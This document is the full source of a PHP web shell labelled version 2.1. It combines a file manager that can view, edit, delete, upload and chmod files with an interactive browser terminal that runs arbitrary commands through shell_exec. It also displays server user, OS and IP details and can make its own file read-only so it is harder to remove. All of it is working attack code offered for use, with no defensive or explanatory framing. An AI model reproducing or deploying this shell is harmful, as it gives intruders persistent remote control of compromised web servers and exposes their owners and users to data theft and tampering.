&lt;?php
$version = "2.1";
if(isset($_POST['uplood'])) {
$uploaddir = $_POST['path'];
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
echo "&lt;script&gt;document.location='?path=" . addslashes($uploaddir) . "'&lt;/script&gt;";
        } else {
echo "&lt;script&gt;document.location='?path=" . addslashes($uploaddir) . "'&lt;/script&gt;";
        }}
}
if (isset($_POST['edit'])) {
$source = $_POST['source'];
$source = str_replace("\\'","'",$source);
$source = str_replace("\\\\","\\",$source);
$source = str_replace('\\"','"',$source);
$source = str_replace('&lt;','&lt;',$source);
$source = str_replace('&gt;','&gt;',$source);
$source = str_replace('&amp;','&',$source);
$source = str_replace('uiiplastzo','+',$source);
        $a = $source;
echo $a;
        $myFile = $_POST['path'];
        $fh = fopen($myFile, 'w') or die("can't open file");
        fwrite($fh, $a);
        fclose($fh);
die();
}

if (isset($_POST['action'])) {
if (isset($_POST['path'])) {
if (isset($_POST['mod'])) {
$mod = intval($_POST['mod'],8);
chmod($_POST['path'], $mod);
die();
}}}

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
$oz = 'win';
}
else {
$oz = 'linux';
}


$action = 'fm';
if(isset($_GET['action'])) {
$action = $_GET['action'];
}

if($action =='dt') {
if(isset($_GET['path'])) {
if(isset($_GET['file'])) {
unlink($_GET['path'] . $_GET['file']);
echo '&lt;script&gt;document.location="?path=' .  addslashes($_GET['path']) . '";&lt;/script&gt;';
}}
};
if($action =='fs') {
$path = $_GET['path'];
$command = $_GET['cm'];
$command = str_replace("amp;","",$command);
$command = str_replace("&lt;","&lt;",$command);
$command = str_replace("&gt;","&gt;",$command);
$command = str_replace("\n","",$command);
$path = str_replace("\n","",$path);
shell_exec('cd ' . $path . ' && ' . $command);
echo '&lt;script&gt;document.location="?path=' .  addslashes($_GET['path']) . '";&lt;/script&gt;';
}

if($action =='dtd') {
if(isset($_GET['path'])) {
if(isset($_GET['file'])) {
rmdir($_GET['path'] . $_GET['file']);
echo '&lt;script&gt;document.location="?path=' .  addslashes($_GET['path']) . '";&lt;/script&gt;';
}}
};

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
$os = 1;
$dd = 'cd';
}
else {
$os = 2;
$dd = 'pwd';
}
if(isset($_POST['start'])) {
if($os ==1) {
$command = 'cd';
}
else {
$command = 'pwd';
}
$output = shell_exec($command);
echo $output;
die();
}

if(isset($_POST['command'])) {
if(isset($_POST['path'])) {
$command = $_POST['command'];
$command = str_replace("amp;","",$command);
$command = str_replace("&lt;","&lt;",$command);
$command = str_replace("&gt;","&gt;",$command);
$command = str_replace("\n","",$command);
$path = $_POST['path'];
$path = str_replace("\n","",$path);
echo shell_exec('cd ' . $path . ' && ' . $command . ' && echo z3r0separator && ' . $dd);
die();
}
}

?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
body {
background-color:black;
white-space: pre-wrap;
color:lightgray;
font-family:Lucida Console;
}
span,input,textarea {
outline:0;
}
pre {
white-space: pre-wrap;
margin:0px;
font-family: Lucida Console;
}

table {
white-space: pre-wrap;
margin:0px;
border-style:none;
font-family: Lucida Console;
}

::-webkit-scrollbar-thumb {
  background-color: #fff;
  -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 1);
  border-radius: 10px;
}
 
::-webkit-scrollbar-thumb:vertical:hover { 
  background-color: #fff;


}
::-webkit-scrollbar {
      width: 15px;
} 


::-webkit-scrollbar-corner {
	border-bottom-right-radius:20px;
} 
a {
color:lightgray;
}
tr:hover {
background-color:#111;
}
input {
color:lightgray;
background-color:black;
font-family:Lucida Console;
border-style:none;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
/**************************************************************************************/
*blank*
/**************************************************************************************/ &lt;?= $version ?&gt;
&lt;?php
echo '&lt;table&gt;&lt;tr&gt;&lt;td&gt;';
echo 'User             : ' . get_current_user() . "    \n";
echo 'OS               : ' . PHP_OS . "    \n";
echo '&lt;/td&gt;&lt;td&gt;';
echo 'Server IP Address: ' . $_SERVER['SERVER_ADDR'] . "\n";
echo 'Software         : ' . $_SERVER["SERVER_SOFTWARE"] . "\n";
echo '&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
?&gt;
&lt;a href="?"&gt;File manager&lt;/a&gt; | &lt;a href="?action=sh"&gt;Shell&lt;/a&gt; | &lt;a href="?action=pr"&gt;Protect The shell&lt;/a&gt;
&lt;?php
if($action == 'sh') {
?&gt;

&lt;div id="shell"&gt;
&lt;/div&gt;

&lt;script&gt;

  if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else {  // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

function line(path) {
if(path == undefined) {
path = "/i/dont/know";
}
path = path;
statement = path.replace(/\n/g,"") + '&lt;/font&gt;&gt;&lt;span id="command" onkeypress="runScript(event)"&gt;&lt;/span&gt;';
document.getElementById("shell").innerHTML += statement;
document.getElementById("command").contentEditable = true;
document.getElementById("command").focus();
}

function runScript(e) {
    if (e.keyCode == 13) {
exec();
document.getElementById("command").contentEditable = false;
document.getElementById("command").id = "done";
backup = path;
    }
}

function exec() {
command = document.getElementById("command").innerHTML;
xmlhttp.open("POST",document.location,true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("command=" + command.replace(/&/g,"%26") + "&path=" + path.replace(/&/g,"%26"));
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
results = xmlhttp.responseText.replace("\n","").split(&lt;?php if($os==1){echo '"z3r0separator "';}else{echo '"z3r0separator"';}?&gt;);
path = results[1];
result = results[0];
result = result.replace(/&lt;/g,"&lt;");
result = result.replace(/&gt;/g,"&gt;");
if(path == undefined) {
path = backup;
}
statement = "&lt;pre&gt;" + result + "&lt;/pre&gt;"
document.getElementById("shell").innerHTML += statement;
line(path);
    }
  }
}

function start() {
xmlhttp.open("POST",document.location,true);
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
path =xmlhttp.responseText;
line(path);
    }
  }
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("start=1");
}

start();
&lt;/script&gt;


&lt;?php
}


if($action == 'pr') {
chmod($SCRIPT_FILENAME, 0555);
echo 'Protected!';
}

if($action == 'fm') {
$path = realpath(dirname(__FILE__));
if(isset($_GET['path'])) {
$path = $_GET['path'];
}
chdir($path);
$path = realpath($path);
$path = str_replace("\\","/",$path);
$dirs = explode("/",$path);
$dirsc = count($dirs);
echo 'path : ';
for($i=0;$i&lt;$dirsc;$i++) {
$hr .= $dirs[$i] . "/";
echo "&lt;a href=?path=$hr&gt;$dirs[$i]&lt;/a&gt;/";
}
$iterator = new DirectoryIterator($path);
echo '&lt;table&gt;';
echo '&lt;tr&gt;&lt;td&gt;name&lt;/td&gt;&lt;td&gt;view     &lt;/td&gt;&lt;td&gt;edit     &lt;/td&gt;&lt;td&gt;delete     &lt;/td&gt;&lt;td&gt;Perms     &lt;/td&gt;&lt;td&gt;IsWritable&lt;/td&gt;&lt;td&gt;Last Modified&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;';
foreach ($iterator as $fileinfo) {
    if ($fileinfo-&gt;isDir()) {
        $octal_perms = substr(sprintf('%o', $fileinfo-&gt;getPerms()), -4);
        echo '&lt;tr&gt;&lt;td&gt;[&lt;a href="?path=' . $path . '/' . $fileinfo-&gt;getFilename() . '"&gt;' . $fileinfo-&gt;getFilename() . '&lt;/a&gt;]&lt;/td&gt;&lt;td&gt;&lt;a href="?path=' . $path . '/' . $fileinfo-&gt;getFilename() . '"&gt;#&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="?action=dtd&path=' . $path . '/&file=' . $fileinfo-&gt;getFilename()  . '"&gt;#&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;span id="perms"&gt;&lt;a href=javascript:chmod("' . $path . '/' . $fileinfo-&gt;getFilename() .  '")&gt;' . $octal_perms . '&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;td&gt;' . $fileinfo-&gt;isWritable() . "&lt;/td&gt;&lt;td&gt;" . date ("F d Y H:i:s.", filemtime($path . '/' . $fileinfo-&gt;getFilename())) . "&lt;/td&gt;&lt;td&gt;Dir&lt;/td&gt;&lt;/tr&gt;\n";
    }
}
foreach ($iterator as $fileinfo) {
    if ($fileinfo-&gt;isFile()) {
        $octal_perms = substr(sprintf('%o', $fileinfo-&gt;getPerms()), -4);
$msize = filesize($path . '/' . $fileinfo-&gt;getFilename());
$msize = $msize / 1000;
$size = "$msize";
$size = str_replace(".",",",$size);
$size = str_replace("0,0","",$size);
$size = str_replace("0,","",$size);
        echo '&lt;tr&gt;&lt;td&gt;&lt;a href="?action=vw&path=' . $path . '&file=' . $fileinfo-&gt;getFilename() . '"&gt;' . $fileinfo-&gt;getFilename() . '&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="?action=vw&path=' . $path . '&file=' . $fileinfo-&gt;getFilename() . '"&gt;#&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="?action=ed&path=' . $path . '&file=' . $fileinfo-&gt;getFilename() . '"&gt;#&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="?action=dt&path=' . $path . '/&file=' . $fileinfo-&gt;getFilename()  . '"&gt;#&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;span id="perms"&gt;&lt;a href=javascript:chmod("' . $path . '/' . $fileinfo-&gt;getFilename() .  '")&gt;' . $octal_perms . '&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;td&gt;' . $fileinfo-&gt;isWritable() . "&lt;/td&gt;&lt;td&gt;" . date ("F d Y H:i:s.", filemtime($path . '/' . $fileinfo-&gt;getFilename())) . "&lt;/td&gt;&lt;td&gt;" . $size . " Bytes&lt;/td&gt;&lt;/tr&gt;\n";
    }
}
echo '&lt;/table&gt;';
?&gt;

Change dir: &lt;span id="direc" contenteditable="true"&gt;&lt;?= $path ?&gt;&lt;/span&gt;&lt;input type="button" onclick="go()" value="Go"&gt;
Execute   : &lt;span id="com" contenteditable="true"&gt;&lt;/span&gt;&lt;input type="button" onclick="exec()" value="Go"&gt;
&lt;form action="?" method="POST" enctype="multipart/form-data" name="myForm"&gt;&lt;input type="hidden" name="uplood" value="1"&gt;&lt;input type="hidden" name="path" value="&lt;?= $path ?&gt;/"&gt;Upload    : &lt;span id="yourBtn" onclick="getFile()"&gt;Click&lt;/span&gt;&lt;input id="upfile" name="userfile" type="file" style="display:none;" value="upload" onchange="sub(this)"/&gt;  &lt;span onclick="up()"&gt;Upload&lt;/span&gt;
&lt;script&gt;
 function getFile(){
   document.getElementById("upfile").click();
 }
 function sub(obj){
    var file = obj.value;
    var fileName = file.split("\\");
    document.getElementById("yourBtn").innerHTML = fileName[fileName.length-1];
  }
function up() {
document.myForm.submit();
    event.preventDefault();
}
  if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else {  // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
function go() {
z = document.getElementById("direc").innerHTML;
document.location = "?path=" + z;
}

function exec() {
x = document.getElementById("direc").innerHTML;
z = document.getElementById("com").innerHTML;
document.location = "?action=fs&path=" + x + "&cm=" + z;
}

function chmod(path) {
var mod = prompt("Chmod : " + path , "0755");
if(mod.length == 4) {
xmlhttp.open("POST","?",true);
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
alert("Permschanged.")
    }
  }
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("action=cm&path=" + path + "&mod=" + mod);
}
}
&lt;/script&gt;
&lt;?php
}
if($action=='vw') {
$path = "";
$file = "";
if(isset($_GET['path'])) {
$path = $_GET['path'] . '/';
}
if(isset($_GET['file'])) {
$file = $_GET['file'];
}
$source = file_get_contents($path . $file);
echo "Directory : &lt;a href=?path=$path&gt;$path&lt;/a&gt; \n";
echo "Filename  : $file \n";
echo "Fullpath  : $path$file \n\n";
$source = str_replace("&lt;","&lt;",$source);
$source = str_replace("&gt;","&gt;",$source);
echo $source;
}

if($action=='ed') {
$path = "";
$file = "";
if(isset($_GET['path'])) {
$path = $_GET['path'] . '/';
}
if(isset($_GET['file'])) {
$file = $_GET['file'];
}
$source = file_get_contents($path . $file);
echo "Directory : &lt;a href=?path=$path&gt;$path&lt;/a&gt; \n";
echo "Filename  : $file \n";
echo "Fullpath  : $path$file \n\n";
$source = str_replace("&lt;","&lt;",$source);
$source = str_replace("&gt;","&gt;",$source);
$source = str_replace("&","&amp;",$source);
$source = str_replace("&lt;","&lt;",$source);
$source = str_replace("&gt;","&gt;",$source);
$source = str_replace("&gt;","&amp;gt;",$source);
$source = str_replace("&lt;","&amp;lt;",$source);
echo '&lt;form method="post" action="javascript:edit();"&gt;&lt;input type="hidden" id="path" name="path" value="' . $path . $file . '"&gt;&lt;span name="source" id="source" contenteditable="true"&gt;' . $source . '&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input type="submit"&gt;&lt;/form&gt;';
?&gt;
&lt;script&gt;

  if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else {  // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

function edit() {
source = document.getElementById("source").innerHTML;
source = source.replace(/&/g,"%26");
source = source.replace(/\+/g,"uiiplastzo");
xmlhttp.open("POST","?",true);
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
alert("Saved.")
    }
  }
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("source=" + source + "&path=" + document.getElementById("path").value + "&edit=1");
}
&lt;/script&gt;
&lt;?php
}

?&gt;
&lt;/body&gt;
&lt;/html&gt;